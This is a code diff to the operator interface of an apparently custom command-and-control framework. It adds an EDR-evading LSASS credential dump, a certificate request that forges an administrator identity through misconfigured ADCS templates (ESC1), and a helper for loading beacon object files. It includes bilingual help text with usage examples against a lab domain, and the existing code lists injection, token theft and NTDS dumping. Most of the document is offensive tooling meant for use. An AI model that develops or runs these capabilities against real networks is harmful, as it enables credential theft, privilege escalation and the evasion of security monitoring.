@@ -4595,7 +4595,10 @@ function agentContextMenu(e, agentId) {
       {label:'ℹ️  Sysinfo',           action:{fn:'selectAndTask', id, type:'SYSINFO',       args:''}},
       {label:'📋  Process List',      action:{fn:'openProcessList', id}},
       {label:'🔑  Whoami / Token',     action:{fn:'selectAndTask', id, type:'TOKEN_WHOAMI',  args:''}},
-      ...(isWin ? [{label:'💾  Dump lsass',         action:{fn:'selectAndTask', id, type:'MINIDUMP',    args:'{}'}}] : []),
+      ...(isWin ? [
+        {label:'💾  Dump lsass (MiniDump)',   action:{fn:'selectAndTask', id, type:'MINIDUMP',      args:'{}'}},
+        {label:'🩻  Dump lsass (NT — EDR bypass)', action:{fn:'selectAndTask', id, type:'LSASS_DUMP_NT', args:''}},
+      ] : []),
     ]},
     {_sub:'🔍  Port Scan', items:[
       {label:'Top 100 ports',    action:{fn:'portScan', id, target:a.ip, ports:'21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,993,995,1433,3268,3306,3389,5985,8080,8443', ms:'300', label:'Top100'}},
@@ -7672,6 +7675,12 @@ const AC_COMMANDS = [
   ['reg list','reg list <HIVE\\Path> — listar subclaves'],
   // SSH exec
   ['ssh-exec','ssh-exec <host> [port] <user> <pass> <cmd> — ejecutar comando vía SSH'],
+  // LSASS via NtReadVirtualMemory (sin MiniDumpWriteDump — evasión EDR)
+  ['lsass-dump-nt','lsass-dump-nt [pid] — volcar lsass con NtReadVirtualMemory y construir MDMP manual (evita MiniDumpWriteDump)'],
+  // ADCS certificate requests
+  ['adcs-request','adcs-request <ca> <template> <subject> [san=upn@domain] [out=C:\\path\\cert.pfx] — solicitar certificado vía certreq.exe (ESC1-6)'],
+  // BOF store info
+  ['bof-list','bof-list — mostrar info sobre tipos de argumentos BOF soportados'],
 ];
 
 // Commands only available on Windows agents — hidden from autocomplete on Linux agents
@@ -7699,6 +7708,7 @@ const AC_WIN_ONLY = new Set([
   'elevate fodhelper','elevate computerdefaults','elevate cmlua',
   'peb-spoof','hwbp-clear','ntds-dump',
   'reg','reg query','reg set','reg delete','reg list',
+  'lsass-dump-nt','adcs-request','bof-list',
 ]);
 
 let acIdx = -1;
@@ -8739,7 +8749,48 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • Sin pid, busca lsass.exe automáticamente → dump de credenciales en memoria
   • El .dmp se descarga al servidor y aparece en la pestaña Files
   • Analizar offline con: pypykatz lsa minidump lsass.dmp
-  • EDRs detectan MiniDumpWriteDump directo → considerar técnicas alternativas (ProcDump, comsvcs.dll)`,
+  • EDRs detectan MiniDumpWriteDump directo → usar lsass-dump-nt para evasión`,
+
+  'lsass-dump-nt': `<b>lsass-dump-nt</b> — volcar lsass con NtReadVirtualMemory (evasión EDR)
+
+  <span class="console-section">USO</span>
+  lsass-dump-nt [pid]
+
+  <span class="console-section">EJEMPLOS</span>
+  lsass-dump-nt          → pid de lsass automático
+  lsass-dump-nt 664      → PID explícito
+
+  <span class="console-section">DIFERENCIA CON MINIDUMP</span>
+  • No llama a MiniDumpWriteDump (API monitoreada por EDRs)
+  • Usa NtReadVirtualMemory directamente vía GetProcAddress
+  • Construye el MDMP manualmente (SystemInfo + ModuleList + Memory64List)
+  • El .dmp se descarga y analiza igual: pypykatz lsa minidump lsass_nt.dmp
+  • Requiere SeDebugPrivilege (SYSTEM o admin con debug)`,
+
+  'adcs-request': `<b>adcs-request</b> — solicitar certificado ADCS vía certreq.exe (ESC1-6)
+
+  <span class="console-section">USO</span>
+  adcs-request &lt;ca&gt; &lt;template&gt; &lt;subject&gt; [san=upn@domain] [out=C:\\path\\cert.pfx]
+
+  <span class="console-section">EJEMPLOS</span>
+  adcs-request "ca.north.sevenkingdoms.local\\north-CA" User hodor san=administrator@north.sevenkingdoms.local
+  adcs-request "ca\\NORTH-CA" Machine CASTELBLACK out=C:\\Users\\Public\\cert.pfx
+
+  <span class="console-section">NOTAS</span>
+  • ESC1: template permite SAN arbitrario → san=administrator@domain para impersonar DA
+  • ESC3/ESC4: explotar permisos débiles en enrollment agents y template ACLs
+  • El cert se descarga como base64 y aparece en Files; usar con Rubeus o certipy
+  • Requiere que certreq.exe esté disponible (Windows Server/Client estándar)`,
+
+  'bof-list': `<b>bof-list</b> — información sobre tipos de argumentos BOF
+
+  <span class="console-section">USO</span>
+  bof-list
+
+  <span class="console-section">NOTAS</span>
+  • Muestra los tipos de argumentos soportados: z, i, s, b, Z, B
+  • Para cargar BOFs: bof-store load &lt;nombre&gt; &lt;archivo.coff&gt;
+  • Para ejecutar: bof &lt;nombre|archivo.o&gt; [args]`,
 
   'port-scan': `<b>port-scan</b> — host discovery y TCP port scan desde el agente
 
@@ -9540,7 +9591,48 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   • Without pid, auto-locates lsass.exe → credential memory dump
   • .dmp downloaded to server, appears in Files tab
   • Analyze offline with: pypykatz lsa minidump lsass.dmp
-  • EDRs detect direct MiniDumpWriteDump → consider alternatives (ProcDump, comsvcs.dll)`,
+  • EDRs detect direct MiniDumpWriteDump → use lsass-dump-nt for evasion`,
+
+  'lsass-dump-nt': `<b>lsass-dump-nt</b> — dump lsass via NtReadVirtualMemory (EDR evasion)
+
+  <span class="console-section">USAGE</span>
+  lsass-dump-nt [pid]
+
+  <span class="console-section">EXAMPLES</span>
+  lsass-dump-nt          → auto-detect lsass PID
+  lsass-dump-nt 664      → explicit PID
+
+  <span class="console-section">VS MINIDUMP</span>
+  • Does NOT call MiniDumpWriteDump (API monitored by EDRs)
+  • Uses NtReadVirtualMemory directly via GetProcAddress
+  • Manually constructs MDMP (SystemInfo + ModuleList + Memory64List)
+  • Analyze the same way: pypykatz lsa minidump lsass_nt.dmp
+  • Requires SeDebugPrivilege (SYSTEM or admin w/ debug)`,
+
+  'adcs-request': `<b>adcs-request</b> — request ADCS certificate via certreq.exe (ESC1-6)
+
+  <span class="console-section">USAGE</span>
+  adcs-request &lt;ca&gt; &lt;template&gt; &lt;subject&gt; [san=upn@domain] [out=C:\\path\\cert.pfx]
+
+  <span class="console-section">EXAMPLES</span>
+  adcs-request "ca.north.sevenkingdoms.local\\north-CA" User hodor san=administrator@north.sevenkingdoms.local
+  adcs-request "ca\\NORTH-CA" Machine CASTELBLACK out=C:\\Users\\Public\\cert.pfx
+
+  <span class="console-section">NOTES</span>
+  • ESC1: template allows arbitrary SAN → san=administrator@domain to impersonate DA
+  • ESC3/ESC4: exploit weak enrollment agent permissions and template ACLs
+  • Cert downloaded as base64, appears in Files; use with Rubeus or certipy
+  • Requires certreq.exe (standard on Windows Server/Client)`,
+
+  'bof-list': `<b>bof-list</b> — BOF argument type reference
+
+  <span class="console-section">USAGE</span>
+  bof-list
+
+  <span class="console-section">NOTES</span>
+  • Shows supported argument types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob)
+  • Load BOFs: bof-store load &lt;name&gt; &lt;file.coff&gt;
+  • Run: bof &lt;name|file.o&gt; [args]`,
 
   'port-scan': `<b>port-scan</b> — host discovery and TCP port scan from the agent
 
@@ -10204,6 +10296,18 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     }
     case 'download': taskType='DOWNLOAD'; taskArgs=JSON.stringify({path:args}); break;
     case 'minidump': taskType='MINIDUMP'; taskArgs=args ? (args.startsWith('{') ? args : JSON.stringify({pid:parseInt(args,10)})) : '{}'; break;
+    case 'lsass-dump-nt': taskType='LSASS_DUMP_NT'; taskArgs=args ? args.trim() : ''; break;
+    case 'adcs-request': {
+      // adcs-request <ca> <template> <subject> [san=upn@domain] [out=C:\path]
+      const adcsParts = args.trim().split(/\s+/);
+      const adcsObj = {ca:adcsParts[0]||'', template:adcsParts[1]||'', subject:adcsParts[2]||''};
+      for (let i=3;i<adcsParts.length;i++) {
+        if (adcsParts[i].startsWith('san=')) adcsObj.san=adcsParts[i].slice(4);
+        else if (adcsParts[i].startsWith('out=')) adcsObj.out=adcsParts[i].slice(4);
+      }
+      taskType='ADCS_REQUEST'; taskArgs=JSON.stringify(adcsObj); break;
+    }
+    case 'bof-list': taskType='BOF_LIST'; taskArgs=''; break;
     case 'port-scan': taskType='PORT_SCAN'; taskArgs=args; break;
 
     // ── Lateral movement ───────────────────────────────────────────────────
